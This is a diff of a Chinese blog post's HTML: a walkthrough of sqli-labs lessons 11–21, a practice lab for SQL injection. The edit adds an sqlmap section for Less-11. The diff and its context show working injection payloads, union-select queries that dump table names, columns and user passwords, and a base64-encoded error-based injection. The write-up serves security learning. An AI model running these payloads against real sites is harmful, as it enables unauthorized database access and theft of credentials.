@@ -87,13 +87,13 @@
 
 
 
-<meta name="description" content="Less-111.开始为post类型的注入，先加个单引号，报错如下。 构造出SQL语句应该为：select username,password from users where username=&amp;#39; &amp;#39;   &amp;#39; and password=&amp;#39;     2&amp;#39; limit 0,1; 也即是password字段被单引号包含了&amp;#39; and password=&amp;#">
+<meta name="description" content="Less-11手工注入1.开始为post类型的注入，先加个单引号，报错如下。 构造出SQL语句应该为：select username,password from users where username=&amp;#39; &amp;#39;   &amp;#39; and password=&amp;#39;     2&amp;#39; limit 0,1; 也即是password字段被单引号包含了&amp;#39; and passwor">
 <meta name="keywords" content="sqli-labs,SQL注入">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Sqli-Labs-Less11-21">
 <meta property="og:url" content="https://clwsec.github.io/2019/03/12/sqli-labs-Less11-21/index.html">
 <meta property="og:site_name" content="clwsec">
-<meta property="og:description" content="Less-111.开始为post类型的注入，先加个单引号，报错如下。 构造出SQL语句应该为：select username,password from users where username=&amp;#39; &amp;#39;   &amp;#39; and password=&amp;#39;     2&amp;#39; limit 0,1; 也即是password字段被单引号包含了&amp;#39; and password=&amp;#">
+<meta property="og:description" content="Less-11手工注入1.开始为post类型的注入，先加个单引号，报错如下。 构造出SQL语句应该为：select username,password from users where username=&amp;#39; &amp;#39;   &amp;#39; and password=&amp;#39;     2&amp;#39; limit 0,1; 也即是password字段被单引号包含了&amp;#39; and passwor">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-f23ac73cb6ba3e9c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
 <meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-38eb6c23c53cb556.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
@@ -103,6 +103,10 @@
 <meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-932191fb4fab86d4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
 <meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-f4a9b74fff06d2cd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
 <meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-2d5c54347ecf18eb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-f3f6c68b4c547027.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-2b77ce0c8e1d5d13.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-5db9eff924b1a191.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-99e0685020238121.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
 <meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-42282d6e08756d77.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
 <meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-0347b35bb42d9298.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
 <meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-509fbf311be25a53.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
@@ -140,10 +144,10 @@
 <meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-8ed20e6e8a272659.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
 <meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-f337e35f80da5132.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
 <meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-7e8f7743cd211bc2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:updated_time" content="2019-03-13T15:39:54.554Z">
+<meta property="og:updated_time" content="2019-03-14T10:03:30.386Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Sqli-Labs-Less11-21">
-<meta name="twitter:description" content="Less-111.开始为post类型的注入，先加个单引号，报错如下。 构造出SQL语句应该为：select username,password from users where username=&amp;#39; &amp;#39;   &amp;#39; and password=&amp;#39;     2&amp;#39; limit 0,1; 也即是password字段被单引号包含了&amp;#39; and password=&amp;#">
+<meta name="twitter:description" content="Less-11手工注入1.开始为post类型的注入，先加个单引号，报错如下。 构造出SQL语句应该为：select username,password from users where username=&amp;#39; &amp;#39;   &amp;#39; and password=&amp;#39;     2&amp;#39; limit 0,1; 也即是password字段被单引号包含了&amp;#39; and passwor">
 <meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/9216631-f23ac73cb6ba3e9c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
 
 
@@ -422,7 +426,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  3k
+                  3.1k
                 </span>
               
 
@@ -447,7 +451,7 @@
       
 
       
-        <h3 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h3><p>1.开始为post类型的注入，先加个单引号，报错如下。<br><img src="https://upload-images.jianshu.io/upload_images/9216631-f23ac73cb6ba3e9c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+        <h3 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h3><h4 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h4><p>1.开始为post类型的注入，先加个单引号，报错如下。<br><img src="https://upload-images.jianshu.io/upload_images/9216631-f23ac73cb6ba3e9c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
 <p>构造出SQL语句应该为：<code>select username,password from users where username=&#39; &#39;   &#39; and password=&#39;     2&#39; limit 0,1;</code> 也即是password字段被单引号包含了<code>&#39; and password=&#39;</code>，导致 出现<code>2&#39; limit 0,1;</code>引号不匹配的情况。下图看起来更直观些。<br><img src="https://upload-images.jianshu.io/upload_images/9216631-38eb6c23c53cb556.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
 <p>2.所以，可构造如下语句：<code>&#39;      #</code> 。 <code>#</code>把后面的都注释掉，然后在其前面加上自己构造的语句。<br>3.先用group by 看看有多少列：<code>&#39; group by 1</code>，经过测试，共2个字段。<br><img src="https://upload-images.jianshu.io/upload_images/9216631-997151ce0a20bcfa.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
 <p>4.下面，开始使用联合查询：<code>-1&#39; union select 1,2 #</code>返回正常，开始构造语句。<br><img src="https://upload-images.jianshu.io/upload_images/9216631-90be2fc164109727.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
@@ -456,6 +460,11 @@
 <p>7.查列名<code>&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; #</code><br><img src="https://upload-images.jianshu.io/upload_images/9216631-f4a9b74fff06d2cd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
 <p>8.查内容：<code>&#39; union select group_concat(username),group_concat(password) from security.users #</code><br><img src="https://upload-images.jianshu.io/upload_images/9216631-2d5c54347ecf18eb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
 <p>OK，已经得到想要的。</p>
+<h4 id="用sqlmap注入"><a href="#用sqlmap注入" class="headerlink" title="用sqlmap注入"></a>用sqlmap注入</h4><p>1.首先，使用<code>BurpSuite</code>抓包，然后保存抓取到的内容。例如：保存为use.txt，把它放至某个目录下，这里为：<code>F:/temp/use.txt</code>。<br><img src="https://upload-images.jianshu.io/upload_images/9216631-f3f6c68b4c547027.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p>2.首先，判断是否存在SQL注入漏洞，<code>python2 sqlmap.py -r F:/temp/use.txt - --batch</code> 得到两个注入点，如图：<br><img src="https://upload-images.jianshu.io/upload_images/9216631-2b77ce0c8e1d5d13.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p>3.查询当前数据库<code>python2 sqlmap.py -r F:/temp/use.txt - --batch --current-db</code><br><img src="https://upload-images.jianshu.io/upload_images/9216631-5db9eff924b1a191.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p>4.查询表:：<code>python2 sqlmap.py -r F:/temp/use.txt - --batch -D security --tables</code><br><img src="https://upload-images.jianshu.io/upload_images/9216631-99e0685020238121.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p>5.剩下的查询和<code>Less-1</code>的用法一样，列-内容，一个一个爆即可。</p>
 <hr>
 <h3 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h3><p>1.加单引号，正常，加双引号，报错：<br><img src="https://upload-images.jianshu.io/upload_images/9216631-42282d6e08756d77.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
 <p>由图可知，为双引号加括号闭合。<br>2.构造：<code>&quot;)    #</code>返回正常，所以用<code>Less-11</code>构造的方法构造语句即可。即<code>&quot;)   构造的语句 #</code> 不在赘述。</p>
@@ -524,7 +533,7 @@
 <p><img src="https://upload-images.jianshu.io/upload_images/9216631-f337e35f80da5132.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
 <p>成功，<strong>这里用<code>database()</code>不行，因为自己太菜，目前也说不出个为什么，希望知道的大佬指点一下。之所以在这里从新构造，是因为下面的构造在开始时，用的也是<code>database()</code>，结果提示超过一行，但想着<code>database()</code>应该就是指<code>security</code>好像不需要<code>limit n,1</code>来限制，所以从新构造成这个形式。</strong></p>
 <p>3.换一种构造试试：<code>admin&#39;) and (select 1 from (select count(*),concat((select schema_name from information_schema.schemata limit 0,1),&#39;;&#39;,floor(rand()*2)) as x from information_schema.tables group by x)as a)#</code><br>编码后：<code>YWRtaW4nKSBhbmQgKHNlbGVjdCAxIGZyb20gKHNlbGVjdCBjb3VudCgqKSxjb25jYXQoKHNlbGVjdCBzY2hlbWFfbmFtZSBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS5zY2hlbWF0YSBsaW1pdCAwLDEpLCc7JyxmbG9vcihyYW5kKCkqMikpIGFzIHggZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIGdyb3VwIGJ5IHgpYXMgYSkj</code><br><img src="https://upload-images.jianshu.io/upload_images/9216631-7e8f7743cd211bc2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
-<p>成功，剩下的稍微改改就好，改来改去，转来转去的，试的头疼。这题好像还提示日期错误，忙着做题了，没来的急处理，请大家自行忽略。</p>
+<p>成功，剩下的稍微改改就好，改来改去，转来转去的，试的头疼。这题好像还提示日期错误，忙着做题了，没来的急处理，请大家自行忽略。后来查了一下，解决方法为：<a href="http://beikeit.com/post-682.html" target="_blank" rel="noopener">It is not safe to rely on the  the system’s timezone settings解决方法</a></p>
 <hr>
 <p>目前就先到这吧，从页面看提示，这篇文章的所有题目都是post类型的，后面好像还有，但还是放下一篇吧。当然，文中如有错误或其他更好的语句或解法，还希望诸位不吝赐教，多谢。</p>
 <hr>
@@ -532,6 +541,7 @@
 <ol>
 <li><a href="https://blog.csdn.net/zpy1998zpy/article/details/80631036" target="_blank" rel="noopener">学习基于extractvalue()和updatexml()的报错注入</a></li>
 <li><a href="https://bbs.pediy.com/thread-218235.htm" target="_blank" rel="noopener">SQL注入新手教程</a>(讲的很好的内容，之前没发现，现在才看到)</li>
+<li><a href="http://beikeit.com/post-682.html" target="_blank" rel="noopener">It is not safe to rely on the  the system’s timezone settings解决方法</a></li>
 </ol>
 </blockquote>
 <hr>
@@ -793,7 +803,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-11"><span class="nav-number">1.</span> <span class="nav-text">Less-11</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-12"><span class="nav-number">2.</span> <span class="nav-text">Less-12</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-13"><span class="nav-number">3.</span> <span class="nav-text">Less-13</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-14"><span class="nav-number">4.</span> <span class="nav-text">Less-14</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-15"><span class="nav-number">5.</span> <span class="nav-text">Less-15</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-16"><span class="nav-number">6.</span> <span class="nav-text">Less-16</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-17"><span class="nav-number">7.</span> <span class="nav-text">Less-17</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-18"><span class="nav-number">8.</span> <span class="nav-text">Less-18</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-19"><span class="nav-number">9.</span> <span class="nav-text">Less-19</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-20"><span class="nav-number">10.</span> <span class="nav-text">Less-20</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-21"><span class="nav-number">11.</span> <span class="nav-text">Less-21</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#参考："><span class="nav-number">12.</span> <span class="nav-text">参考：</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-11"><span class="nav-number">1.</span> <span class="nav-text">Less-11</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#手工注入"><span class="nav-number">1.1.</span> <span class="nav-text">手工注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#用sqlmap注入"><span class="nav-number">1.2.</span> <span class="nav-text">用sqlmap注入</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-12"><span class="nav-number">2.</span> <span class="nav-text">Less-12</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-13"><span class="nav-number">3.</span> <span class="nav-text">Less-13</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-14"><span class="nav-number">4.</span> <span class="nav-text">Less-14</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-15"><span class="nav-number">5.</span> <span class="nav-text">Less-15</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-16"><span class="nav-number">6.</span> <span class="nav-text">Less-16</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-17"><span class="nav-number">7.</span> <span class="nav-text">Less-17</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-18"><span class="nav-number">8.</span> <span class="nav-text">Less-18</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-19"><span class="nav-number">9.</span> <span class="nav-text">Less-19</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-20"><span class="nav-number">10.</span> <span class="nav-text">Less-20</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-21"><span class="nav-number">11.</span> <span class="nav-text">Less-21</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#参考："><span class="nav-number">12.</span> <span class="nav-text">参考：</span></a></li></ol></div>
             
 
           </div>
@@ -828,7 +838,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">19.6k</span>
+    <span title="Site words total count">19.8k</span>
   
 </div>
 
